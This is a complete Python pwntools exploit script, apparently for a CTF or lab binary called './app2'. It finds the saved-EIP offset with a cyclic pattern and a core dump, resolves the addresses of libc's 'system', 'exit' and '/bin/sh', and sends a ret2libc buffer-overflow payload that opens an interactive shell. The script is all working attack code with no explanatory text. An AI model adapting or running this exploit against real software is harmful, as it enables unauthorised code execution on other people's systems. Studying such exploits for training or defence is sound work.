#!/bin/python3

from pwn import *

app_path = "./app2"

pty = process.PTY
elf = ELF(app_path)
io = process(elf.path, stdin=pty, stdout=pty)
io.clean()
io.sendline(cyclic(100, n=4))
io.wait()
core = io.corefile
info("eip = %#x", core.eip)

eip_offset = cyclic_find(pack(core.eip))
info("eip offset = %d", eip_offset)

libc_addr = core.libc.start
libc = ELF("/usr/lib/i386-linux-gnu/libc-2.31.so")

binsh_addr = next(core.search(b"/bin/sh"))
info("/bin/sh = %#x", binsh_addr)

sys_addr = libc.symbols["system"] + libc_addr
info("System = %#x", sys_addr)
io.close()

exit_addr = libc.symbols["exit"] + libc_addr
info("Exit = %#x", exit_addr)

p = process(elf.path)
gdb.attach(p)
p.readuntil("Please enter your name: \n")
payload = b"a"*eip_offset
payload += p32(sys_addr)
payload += p32(exit_addr)
payload += p32(binsh_addr) #i0xf7f5033c
p.sendline(payload)
p.interactive()
